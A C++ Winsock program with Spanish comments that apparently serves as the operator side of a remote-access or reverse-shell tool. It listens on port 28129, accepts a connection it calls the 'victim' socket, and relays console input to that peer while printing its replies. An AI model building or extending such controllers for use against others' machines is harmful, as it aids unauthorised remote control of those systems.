#include <WinSock2.h>
#include <iostream>
#include <string>
#include <thread>
#include <future>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

#define port "28129"

// TODO: Añadir limpieza y to eso (WSACleanup y liberar variables)

// TODO: Separar las funciones y mensajes de error a otro archivo, por ahora este se queda aca

void error(const char *message, int type)
{
    std::cerr << "ERROR " << message << " WITH CODE " << type << std::endl;
    std::cin.get();
    exit(-1);
}

int main()
{
    int r = 0;
    SOCKET listening_socket = INVALID_SOCKET;
    SOCKET victim_socket = INVALID_SOCKET;
    WSADATA init;

    r = WSAStartup(MAKEWORD(2, 2), &init);
    if (r != 0)
    {
        error("WSA no se inicio correctamente", WSAGetLastError());
    }

    struct addrinfo address_inf;
    ZeroMemory(&address_inf, sizeof(address_inf));
    address_inf.ai_protocol = IPPROTO_TCP;
    address_inf.ai_family = AF_INET;
    address_inf.ai_socktype = SOCK_STREAM;
    address_inf.ai_flags = AI_PASSIVE;
    struct addrinfo *result = NULL;

    r = getaddrinfo(NULL, port, &address_inf, &result);
    if (r != 0)
    {
        error("no se pudo obtener la informacion de direccion del server", WSAGetLastError());
    }

    listening_socket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (listening_socket == INVALID_SOCKET)
    {
        error("no se pudo conectar al socket listener", WSAGetLastError());
    }

    r = bind(listening_socket, result->ai_addr, (int)result->ai_addrlen);
    if (r == SOCKET_ERROR)
    {
        error("no se pudo conectar el listener con la ip", WSAGetLastError());
    }

    freeaddrinfo(result);

    r = listen(listening_socket, SOMAXCONN);
    if (r == SOCKET_ERROR)
    {
        error("no se pudo escuchar en el socket listener", WSAGetLastError());
    }
    victim_socket = accept(listening_socket, NULL, NULL);
    if (victim_socket == INVALID_SOCKET)
    {
        error("no se pudo conectar al socket de la victima", WSAGetLastError());
    }
    closesocket(listening_socket);
    std::cout << "To bien " << victim_socket << std::endl;

    // TODO: Mover esto a otra parte o ponerlo en una clase
    auto th = std::async(std::launch::async, [&]
                         {
        while (true){
            std::string buf;
            std::getline(std::cin,buf);
            int r = send(victim_socket,buf.c_str(),buf.size(),NULL);
            if (r < 0){
                error("no se pudo enviar mensaje",WSAGetLastError());
            }
        } });

    while (true)
    {
        char bufc[100];
        memset(bufc, 0, sizeof(bufc));
        r = recv(victim_socket, bufc, sizeof(bufc), NULL);
        if (r > 0)
        {
            std::cout << bufc << std::endl;
        }
        else if (r < 0)
        {
            error("no se recibio bien el mensaje", WSAGetLastError());
        }
    }
    return 0;
}